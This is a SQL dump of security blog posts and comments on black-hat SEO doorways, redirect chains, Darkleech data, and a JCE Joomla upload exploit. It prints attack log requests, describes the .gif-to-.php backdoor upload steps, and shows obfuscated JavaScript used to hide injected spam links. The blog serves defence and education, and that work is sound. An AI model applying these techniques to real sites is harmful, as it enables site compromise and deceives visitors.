disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (134, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (135, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (136, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (137, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (138, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (139, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis 